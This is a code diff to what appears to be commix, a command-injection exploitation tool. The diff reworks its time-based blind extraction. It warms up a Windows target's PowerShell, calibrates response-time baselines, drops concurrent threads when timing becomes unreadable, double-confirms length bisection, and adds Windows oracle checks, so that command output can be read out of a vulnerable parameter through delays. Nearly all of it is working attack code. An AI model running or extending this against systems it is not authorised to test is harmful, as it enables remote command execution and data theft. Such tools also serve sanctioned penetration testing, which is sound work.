@@ -95,11 +95,46 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     except ValueError:
       _cached_length = None
 
-  def _warm_up_baseline():
+  # The length and character payloads read their value off a PowerShell on the target, and its
+  # first launch is served cold - tens of seconds, where every one after it costs about a second.
+  # Measured, that start reads as a delay the payload never asked for, and recorded, it widens the
+  # model every later comparison is judged against. Paid once here, before either can happen.
+  def _warm_up_target_shell():
+    if settings.TARGET_OS != settings.OS.WINDOWS:
+      return
+    safe_candidate = int(maxlen) * 2 + 100
+    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+      probe = payloads.get_length(separator, cmd, safe_candidate, timesec, http_request_method)
+    else:
+      probe = payloads.cmd_execution(separator, cmd, safe_candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
+    if not probe:
+      return
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Warming up the target's shell, so that its first start is not measured."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    try:
+      requests.perform_injection(prefix, suffix, whitespace, probe, vuln_parameter, http_request_method, url)
+    except KeyboardInterrupt:
+      checks.handle_exploitation_interrupt(filename, url)
+    except Exception:
+      pass
+
+  def _warm_up_baseline(announce=True):
+    fan_out = retrieval_concurrency()
+    # A model of responses asked for one at a time says nothing about how the target answers while
+    # it is serving several: those take longer, and every one of them then reads as a delay the
+    # payload never asked for - which is how a character resolves to a value above the real one.
+    # Sampled again here, the way every probe after it is sent.
+    if fan_out > 1 and not settings.CONCURRENT_BASELINE:
+      settings.CONCURRENT_BASELINE = True
+      del settings.RESPONSE_TIMES[:]
     if len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
-      warn_msg = "Time-related response comparison requires a larger statistical model"
-      warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
-      settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
+      # Silent where the caller has just said what it is taking the model again for: the dots
+      # carry on under that line instead of repeating it.
+      if announce:
+        warn_msg = "Time-related response comparison requires a larger statistical model"
+        warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
+        settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
 
       def _probe():
         safe_candidate = int(maxlen) * 2 + 100
@@ -113,7 +148,6 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
         if settings.VERBOSITY_LEVEL == 0:
           settings.print_data_to_stdout(".")
 
-      fan_out = settings.THREADS if (settings.THREADS > 1 and _THREADS_SUPPORTED) else 1
       while len(settings.RESPONSE_TIMES) < settings.MIN_TIME_RESPONSES:
         try:
           if fan_out > 1:
@@ -131,12 +165,68 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     if checks.check_lagging():
       length_suspect = lagging_detected = True
 
+  # A delay the target's own answers already take is no delay at all - both come back late and the
+  # comparison behind them cannot be read either way. Raised to clear the model before the first
+  # measurement, rather than after a search has spent its requests on answers that all look alike.
+  # Under '--threads' this is what the concurrency costs: several requests at once are served
+  # slower than one, so the delay that told them apart on a quiet target no longer does.
+  # The next delay to try after an answer could not be read: the measured requirement where that is
+  # higher than a single step, since a payload whose own work varies by seconds is never caught up
+  # with one second at a time.
+  def _escalated_delay(current):
+    needed = _needed_delay()
+    stepped = current + settings.TIME_DELAY_STEP
+    return max(stepped, needed) if needed is not None else stepped
+
+  # The delay that would stand above the target's own answers, as the model has them so far.
+  def _needed_delay():
+    threshold = checks.current_delay_threshold()
+    return None if threshold is None else int(threshold) + 1 + settings.TIME_DELAY_STEP
+
+  # Give up the concurrency and take the model again without it, so that what follows is judged
+  # against the way the requests are now sent.
+  def _fall_back_to_single_thread(reason):
+    warn_msg = reason + " Continuing with a single thread"
+    warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
+    # Whatever was printed last is ended first: the carriage return below returns to the start of
+    # the line, and would otherwise write this message over it. Left open after that, so the dots of
+    # the model being taken again carry on under this line.
+    settings.close_progress_line()
+    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
+    settings.THREADED_TIME_RETRIEVAL_CHOICE = False
+    settings.CONCURRENT_BASELINE = False
+    del settings.RESPONSE_TIMES[:]
+    _warm_up_baseline(announce=False)
+
+  def _raise_delay_above_baseline():
+    nonlocal timesec
+    needed = _needed_delay()
+    if needed is None or needed <= timesec:
+      return
+    # Every probe of every character would pay that longer delay, which is more than the threads
+    # save - so where they are what made the answers slow, they go instead of the delay growing.
+    if retrieval_concurrency() > 1:
+      _fall_back_to_single_thread("Concurrent requests would need a longer delay on every probe.")
+      needed = _needed_delay()
+      if needed is None or needed <= timesec:
+        return
+    timesec = settings.CALIBRATED_TIMESEC = needed
+    warn_msg = "Raising the time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "")
+    warn_msg += ", so that it stands above the target's own response times."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
   # Guard timesec so concurrent payloads use the same value for sending and validation.
   timesec_lock = threading.Lock()
 
   delay_candidates = [0] * settings.TIME_DELAY_CANDIDATES
   def _adjust_time_delay(exec_time, lower_limit):
     nonlocal timesec
+    # Never while several requests are in flight. The limit behind this is measured on answers that
+    # were not held back, while most of the probes around them are - and a request that waits its
+    # turn behind those comes back as late as one that was delayed on purpose. Lowered on the
+    # strength of the quick answers, the delay stops standing out from the slow ones at all.
+    if settings.THREADS > 1:
+      return
     if settings.ADJUST_TIME_DELAY_DISABLED or settings.ADJUST_TIME_DELAY_CHOICE == False:
       return
     candidate = settings.TIME_DELAY_STEP + int(round(lower_limit))
@@ -188,8 +278,110 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       settings.print_data_to_stdout(".")
     return decision
 
+  # Told apart by the difference between a condition that must hold and one that cannot, rather
+  # than by a threshold: the payload's own work counts for seconds of its own on a slow target.
+  # Where the two are indistinguishable, every comparison reads as true and the search would settle
+  # on '--maxlen' and then extract that many characters of noise.
+  def _oracle_holds():
+    def _probe_time(candidate):
+      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+        probe = payloads.get_length(separator, cmd, candidate, timesec, http_request_method)
+      else:
+        probe = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
+      if not probe:
+        return None
+      # No progress dot of its own: this runs before the retrieval line is printed, where a dot
+      # would sit on its own under the last prompt.
+      exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, probe, vuln_parameter, http_request_method, url)
+      return exec_time
+
+    impossible = int(maxlen) * 2 + 100
+    for _ in range(settings.FALSE_POSITIVE_RETRIES):
+      try:
+        cannot_hold = _probe_time(impossible)
+        must_hold = _probe_time(int(minlen))
+      except KeyboardInterrupt:
+        checks.handle_exploitation_interrupt(filename, url)
+      if cannot_hold is None or must_hold is None:
+        return True
+      checks.record_baseline_response_time(cannot_hold)
+      if must_hold - cannot_hold >= checks.injected_delay(timesec) / 2.0:
+        return True
+    return False
+
+  # Whether the answers can still be told apart while several requests are in flight - asked of the
+  # target rather than inferred from a model of it. One probe whose condition cannot hold, and so
+  # cannot ask for a delay, is sent alongside the others that do ask for one: if even that one comes
+  # back looking late, then so does everything the retrieval is about to compare. Every round has to
+  # be told apart, because a retrieval makes thousands of those comparisons and reads a character
+  # wrong on any one of them. Returns how late such an answer was, or None where none of them were.
+  def _confounded_by_threads(workers):
+    impossible = int(maxlen) * 2 + 100
+    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+      quick = payloads.get_length(separator, cmd, impossible, timesec, http_request_method)
+      slow = payloads.get_length(separator, cmd, int(minlen), timesec, http_request_method)
+    else:
+      quick = payloads.cmd_execution(separator, cmd, impossible, OUTPUT_TEXTFILE, timesec, http_request_method)
+      slow = payloads.cmd_execution(separator, cmd, int(minlen), OUTPUT_TEXTFILE, timesec, http_request_method)
+    if not quick or not slow:
+      return None
+
+    def _hold_answer_back():
+      # The point of these is the load they put on the target, not what they come back with.
+      threading.current_thread().commix_suppress_output = True
+      try:
+        requests.perform_injection(prefix, suffix, whitespace, slow, vuln_parameter, http_request_method, url)
+      except Exception:
+        pass
+
+    exec_time = 0
+    for _ in range(settings.FALSE_POSITIVE_RETRIES):
+      try:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
+          for _ in range(workers - 1):
+            executor.submit(_hold_answer_back)
+          exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, quick, vuln_parameter, http_request_method, url)
+      except KeyboardInterrupt:
+        checks.handle_exploitation_interrupt(filename, url)
+      if checks.time_related_shell(url_time_response, exec_time, timesec):
+        return exec_time
+    return None
+
+  # Raising the delay instead would cost every probe of every character what the concurrency saves.
+  def _drop_threads_if_timing_unsafe():
+    workers = retrieval_concurrency()
+    if workers <= 1 or not _THREADS_SUPPORTED:
+      return
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Checking whether answers can still be told apart with " + str(workers)
+      debug_msg += " requests in flight."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    exec_time = _confounded_by_threads(workers)
+    if exec_time is None:
+      return
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "An answer that asked for no delay still took " + str(round(exec_time, 1))
+      debug_msg += " seconds while " + str(workers - 1) + " other request"
+      debug_msg += ("s" if workers > 2 else "") + " waited on the target."
+      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+    _fall_back_to_single_thread("Concurrent requests make every answer look delayed on this target.")
+
+  _warm_up_target_shell()
   _warm_up_baseline()
+  _drop_threads_if_timing_unsafe()
   _check_lagging()
+  _raise_delay_above_baseline()
+
+  if settings.VERBOSITY_LEVEL != 0:
+    debug_msg = "Checking that a delayed answer can be told apart from an ordinary one."
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+
+  if not _oracle_holds():
+    err_msg = "The target answers as late for a condition that cannot hold as for one that does, "
+    err_msg += "so the length of the output cannot be measured. Try again with a higher '--time-sec'"
+    err_msg += ", fewer '--threads', or over a less loaded network."
+    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_critical_msg(err_msg))
+    return 0, ""
 
   # Close the warm-up dots line before starting a new spinner line.
   settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
@@ -223,22 +415,36 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
           payload = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
         return _measure_length(payload)
 
+      # Every step is answered twice, and a third time to break a tie: one wrong answer sends the
+      # search into the wrong half, which costs the whole search rather than the one probe.
+      def _length_delayed_confirmed(candidate):
+        first = _length_delayed(candidate)
+        if first == _length_delayed(candidate):
+          return first
+        return _length_delayed(candidate)
+
       def _bisect_length():
         lo = int(minlen) - 1
-        hi = int(maxlen) - 1
-        # Confirm the upper-bound fast path twice, so Continue/verbosity resumes this same step.
-        while True:
+        hi = None
+        # Doubling first, so the bracket is found among plausible lengths. Starting at '--maxlen'
+        # instead would let one late answer settle the search on the upper bound.
+        candidate = max(1, int(minlen))
+        while candidate < int(maxlen):
           try:
-            if hi >= int(minlen) and _length_delayed(hi) and _length_delayed(hi):
-              return hi
-            break
+            if not _length_delayed_confirmed(candidate):
+              hi = candidate
+              break
+            lo = candidate
+            candidate = candidate * 2
           except KeyboardInterrupt:
             checks.handle_exploitation_interrupt(filename, url)
+        if hi is None:
+          hi = int(maxlen)
         # A single value to find, nothing to distribute across threads - stays serial.
         while hi - lo > 1:
           try:
             mid = (lo + hi) // 2
-            if _length_delayed(mid):
+            if _length_delayed_confirmed(mid):
               lo = mid
             else:
               hi = mid
@@ -252,7 +458,9 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
         def _boundary_holds(candidate):
           if not _length_delayed(candidate):
             return False
-          if candidate + 1 < int(maxlen) and _length_delayed(candidate + 1):
+          # The next length up must not hold. Without that negative half, a target that answers
+          # late whatever it is asked has its upper bound accepted as the answer.
+          if _length_delayed(candidate + 1):
             return False
           return True
 
@@ -292,7 +500,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
           revalidations += 1
           settings.print_data_to_stdout(settings.print_error_msg("Invalid length detected. Retrying.."))
           if settings.ADJUST_TIME_DELAY_CHOICE != False:
-            timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
+            timesec = settings.CALIBRATED_TIMESEC = _escalated_delay(timesec)
             warn_msg = "Increasing time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "") + "."
             settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
           output_length = _bisect_length()
@@ -577,7 +785,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
           settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
           if settings.ADJUST_TIME_DELAY_CHOICE != False:
             with timesec_lock:
-              timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
+              timesec = settings.CALIBRATED_TIMESEC = _escalated_delay(timesec)
               new_timesec = timesec
             warn_msg = "Increasing time delay to " + str(new_timesec) + " second" + ("s" if new_timesec > 1 else "") + "."
             settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
@@ -656,7 +864,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
           settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
           if settings.ADJUST_TIME_DELAY_CHOICE != False:
             with timesec_lock:
-              timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
+              timesec = settings.CALIBRATED_TIMESEC = _escalated_delay(timesec)
           candidate = _bisect(timesec)
 
       # One bisection per position - the corruption check below catches systematic bias instead.
@@ -824,20 +1032,29 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     timesec = timesec + random.randint(3, 5)
 
   # Verify the oracle with known logical properties; any failed relationship invalidates the round.
-  if settings.TARGET_OS != settings.OS.WINDOWS and not interpreter:
+  if not interpreter:
     a, c, b = sorted(random.sample(range(1, 50), 3))
     # End on a must-delay check; the caller re-validates the final exec_time.
-    litmus_checks = [
-      (str(a) + " -eq " + str(a), True),
-      (str(a) + " -eq " + str(c), None),   # discarded - lets the backend settle after any earlier delay
-      (str(a) + " -eq " + str(b), False),
-      (str(b) + " -eq " + str(c), False),
-      (str(b) + " " + str(c), False),       # not a valid test expression
-      (str(c) + " -eq " + str(c), True),
-    ]
+    if settings.TARGET_OS == settings.OS.WINDOWS:
+      litmus_checks = [
+        (payloads.windows_condition_check(separator, str(a) + "-" + str(a), 0, timesec), True),
+        (payloads.windows_condition_check(separator, str(a) + "-" + str(c), 0, timesec), None),  # discarded - lets the backend settle after any earlier delay
+        (payloads.windows_condition_check(separator, str(a) + "-" + str(b), 0, timesec), False),
+        (payloads.windows_condition_check(separator, str(b) + "-" + str(c), 0, timesec), False),
+        (payloads.windows_condition_check(separator, "1-1", 999999, timesec), False),  # deliberate mismatch
+        (payloads.windows_condition_check(separator, str(c) + "-" + str(c), 0, timesec), True),
+      ]
+    else:
+      litmus_checks = [
+        (payloads.condition_check(separator, str(a) + " -eq " + str(a), timesec, http_request_method), True),
+        (payloads.condition_check(separator, str(a) + " -eq " + str(c), timesec, http_request_method), None),  # discarded - lets the backend settle after any earlier delay
+        (payloads.condition_check(separator, str(a) + " -eq " + str(b), timesec, http_request_method), False),
+        (payloads.condition_check(separator, str(b) + " -eq " + str(c), timesec, http_request_method), False),
+        (payloads.condition_check(separator, str(b) + " " + str(c), timesec, http_request_method), False),  # not a valid test expression
+        (payloads.condition_check(separator, str(c) + " -eq " + str(c), timesec, http_request_method), True),
+      ]
     verified = True
-    for condition, expect in litmus_checks:
-      payload = payloads.condition_check(separator, condition, timesec, http_request_method)
+    for payload, expect in litmus_checks:
       if payload is None:
         verified = False
         break
@@ -864,22 +1081,18 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
         checks.unexploitable_point(retry_attempt, retry_total)
       return exec_time, ""
 
+  # Only the interpreter path reaches here - the check above answers for every other one, and its
+  # oracle is an exact match rather than the logical relationships used there.
   if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd, previous_cmd = execution.windows_transform_cmd(cmd, technique, interpreter)
 
   output_length = 1
   if not silent and settings.VERBOSITY_LEVEL == 0:
     settings.print_data_to_stdout(".")
-  if interpreter:
-    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-      payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http_request_method)
-    else:
-      payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+    payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http_request_method)
   else:
-    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-      payload = payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
-    else:
-      payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+    payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
 
   def _retry_confirm(payload):
     nonlocal exec_time, vuln_parameter, prefix, suffix
@@ -911,16 +1124,10 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     for ascii_char in range(1, 8):
       if not silent and settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(".")
-      if interpreter:
-        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-          payload = payloads.fp_result_alter_interpreter(separator, cmd, 1, ascii_char, timesec, http_request_method)
-        else:
-          payload = payloads.fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, 1, ascii_char, timesec, http_request_method)
+      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+        payload = payloads.fp_result_alter_interpreter(separator, cmd, 1, ascii_char, timesec, http_request_method)
       else:
-        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-          payload = payloads.fp_result(separator, cmd, 1, ascii_char, timesec, http_request_method)
-        else:
-          payload = payloads.fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method)
+        payload = payloads.fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, 1, ascii_char, timesec, http_request_method)
       if _retry_confirm(payload):
         output.append(ascii_char)
         break
@@ -1101,7 +1308,9 @@ def injection_test_results(response, TAG, randvcalc, technique, payload=None):
       shell = shell[0]
   else:
     html_data = checks.process_page_content(response, action="decode")
-    html_data = re.sub(settings.END_LINE.LF, settings.SINGLE_WHITESPACE, html_data)
+    # A Windows target ends its lines with CRLF, so every line break counts as the one whitespace
+    # the markers are looked up with.
+    html_data = re.sub(r"[" + settings.END_LINE.CR + settings.END_LINE.LF + r"]+", settings.SINGLE_WHITESPACE, html_data)
     html_data = checks.remove_reflected_values(html_data, payload)
     if settings.SKIP_CALC:
       shell = re.findall(r"" + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE , html_data)
@@ -1166,7 +1375,8 @@ def injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, times
     new_line = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
     # Grab execution results
     html_data = checks.process_page_content(response, action="decode")
-    html_data = re.sub(settings.END_LINE.LF, new_line, html_data)
+    # CRLF included, so a Windows target's line breaks are marked the same as a Unix one's.
+    html_data = re.sub(settings.END_LINE.CRLF + r"|[" + settings.END_LINE.CR + settings.END_LINE.LF + r"]", new_line, html_data)
     shell = re.findall(r"" + TAG + new_line + TAG + "(.*)" + TAG + new_line + TAG + "", html_data)
     try:
       if len(re.split(TAG  + "(.*)" + TAG, shell[0])) != 0:
